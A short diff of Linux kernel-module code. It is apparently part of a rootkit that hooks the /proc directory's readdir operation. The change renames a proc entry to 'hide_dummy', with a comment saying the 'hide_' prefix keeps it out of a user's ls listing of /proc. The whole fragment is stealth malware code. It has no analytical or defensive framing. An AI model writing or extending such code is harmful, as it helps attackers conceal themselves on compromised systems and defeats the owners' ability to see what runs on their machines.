@@ -56,8 +56,8 @@ my_proc_readdir(struct file* filep, void *dirent, filldir_t filldir){
 
 bool 
 init_HJ_proc(){
-
-	hide_HJ_dummy = create_proc_entry("dummy", 0777, NULL);
+//name the dummy proc with hide_ prefix so that it won't show when user try to check /proc with ls
+	hide_HJ_dummy = create_proc_entry("hide_dummy", 0777, NULL);
 	HJ_target = hide_HJ_dummy->parent;
 	fops_ptr = ((struct file_operations *)HJ_target->proc_fops);
 	original_proc_readdir = fops_ptr->readdir;
